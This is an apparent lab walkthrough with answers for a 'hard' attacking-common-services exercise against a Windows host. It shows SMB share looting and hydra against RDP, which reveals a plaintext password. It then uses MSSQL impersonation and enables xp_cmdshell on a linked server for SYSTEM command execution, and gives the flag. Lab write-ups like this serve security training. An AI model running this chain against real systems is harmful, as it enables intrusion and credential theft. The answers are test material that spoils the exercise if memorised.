# Section 19: Attacking Common Services - Hard

Module: 11. Attacking Common Services

---

## Questions & Answers

### 1. What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)

Context:
- Emuneration:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.147.74
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-08 22:09 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.15 seconds
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.147.74 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-08 22:09 EDT
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.23% done; ETC: 22:09 (0:00:00 remaining)
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 22:10 (0:00:00 remaining)
Nmap scan report for 10.129.147.74
Host is up (0.17s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.147.74:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.147.74:1433: 
|     Target_Name: WIN-HARD
|     NetBIOS_Domain_Name: WIN-HARD
|     NetBIOS_Computer_Name: WIN-HARD
|     DNS_Domain_Name: WIN-HARD
|     DNS_Computer_Name: WIN-HARD
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-08-09T02:07:44+00:00; -2m41s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-09T02:05:16
|_Not valid after:  2056-08-09T02:05:16
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-09T02:07:43+00:00; -2m42s from scanner time.
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2026-08-08T02:05:07
|_Not valid after:  2027-02-07T02:05:07
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-09T02:07:04+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-09T02:07:07
|_  start_date: N/A
|_clock-skew: mean: -2m41s, deviation: 0s, median: -2m41s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.09 seconds
```
- SMB:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ smbclient -N -L \\\\10.129.147.74

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ smbclient \\\\10.129.147.74\\Home
Password for [WORKGROUP\htb-ac-2162140]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 17:18:21 2022
  ..                                  D        0  Thu Apr 21 17:18:21 2022
  HR                                  D        0  Thu Apr 21 16:04:39 2022
  IT                                  D        0  Thu Apr 21 16:11:44 2022
  OPS                                 D        0  Thu Apr 21 16:05:10 2022
  Projects                            D        0  Thu Apr 21 16:04:48 2022

		7706623 blocks of size 4096. 3143026 blocks available
smb: \> cd HR
smb: \HR\> ls
  .                                   D        0  Thu Apr 21 16:04:39 2022
  ..                                  D        0  Thu Apr 21 16:04:39 2022

		7706623 blocks of size 4096. 3143026 blocks available
smb: \HR\> cd ../IT
smb: \IT\> ls
  .                                   D        0  Thu Apr 21 16:11:44 2022
  ..                                  D        0  Thu Apr 21 16:11:44 2022
  Fiona                               D        0  Thu Apr 21 16:11:53 2022
  John                                D        0  Thu Apr 21 17:15:09 2022
  Simon                               D        0  Thu Apr 21 17:16:07 2022

		7706623 blocks of size 4096. 3143026 blocks available
smb: \IT\> ls Simon
  Simon                               D        0  Thu Apr 21 17:16:07 2022

		7706623 blocks of size 4096. 3143026 blocks available
smb: \IT\> cd Simon
smb: \IT\Simon\> ls
  .                                   D        0  Thu Apr 21 17:16:07 2022
  ..                                  D        0  Thu Apr 21 17:16:07 2022
  random.txt                          A       94  Thu Apr 21 17:16:48 2022

		7706623 blocks of size 4096. 3143026 blocks available
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \IT\Simon\> 
```

**Answer:** `random.txt`

---

### 2. Enumerate the target and find a password for the user Fiona. What is her password?

Context:
- Get `fiona` creds:
```bash
smb: \IT\Simon\> cd ..
smb: \IT\> ls
  .                                   D        0  Thu Apr 21 16:11:44 2022
  ..                                  D        0  Thu Apr 21 16:11:44 2022
  Fiona                               D        0  Thu Apr 21 16:11:53 2022
  John                                D        0  Thu Apr 21 17:15:09 2022
  Simon                               D        0  Thu Apr 21 17:16:07 2022
cd
		7706623 blocks of size 4096. 3143805 blocks available
smb: \IT\> cd Fiona
smb: \IT\Fiona\> ls
  .                                   D        0  Thu Apr 21 16:11:53 2022
  ..                                  D        0  Thu Apr 21 16:11:53 2022
  creds.txt                           A      118  Thu Apr 21 16:13:11 2022

		7706623 blocks of size 4096. 3143805 blocks available
smb: \IT\Fiona\> get creds.txt 
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```
- Brute-force the password:
```bash
┌─[eu-academy-2]─[10.10.14.184]─[htb-ac-2162140@htb-0uxdem4fnk]─[~]
└──╼ [★]$ hydra -l fiona -P creds.txt rdp://10.129.147.74
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-08 22:20:19
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task
[DATA] attacking rdp://10.129.147.74:3389/
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 1 to do in 00:01h, 4 active
[3389][rdp] account on 10.129.147.74 might be valid but account not active for remote desktop: login: fiona password: 48Ns72!bns74@S84NNNSl, continuing attacking the account.
[ERROR] freerdp: The connection failed to establish.
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-08 22:22:07
```

**Answer:** `48Ns72!bns74@S84NNNSl`

---

### 3. Once logged in, what other user can we compromise to gain admin privileges?

Context:
- Check for users that we can gain privileges
```bash
SQL (WIN-HARD\Fiona  guest@master)> SELECT b.name AS impersonatable_login, a.permission_name, a.state_desc FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
impersonatable_login   permission_name   state_desc   
--------------------   ---------------   ----------   
john                   IMPERSONATE       GRANT        

simon                  IMPERSONATE       GRANT     
```


**Answer:** `john`

---

### 4. Submit the contents of the flag.txt file on the Administrator Desktop.

Context:
- `john` doesn't have admin privileges but we can use linked databases to gain
```bash
SQL (john  guest@msdb)> SELECT srvname, isremote FROM sysservers
srvname                 isremote   
---------------------   --------   
WINSRV02\SQLEXPRESS            1   

LOCAL.TEST.LINKED.SRV          0   

SQL (john  guest@msdb)> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
                
-   -   -   -   
1   1   1   1   
```
Change the settings:
```bash
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
```
Command execution works:
```bash
SQL (john  guest@msdb)>  EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
output                
-------------------   
nt authority\system   

NULL                  

SQL (john  guest@msdb)>  EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
output                        
---------------------------   
HTB{46u$!n9_l!nk3d_$3rv3r$}   
```


**Answer:** `HTB{46u$!n9_l!nk3d_$3rv3r$}`

---

[Back to Module Index](./README.md)
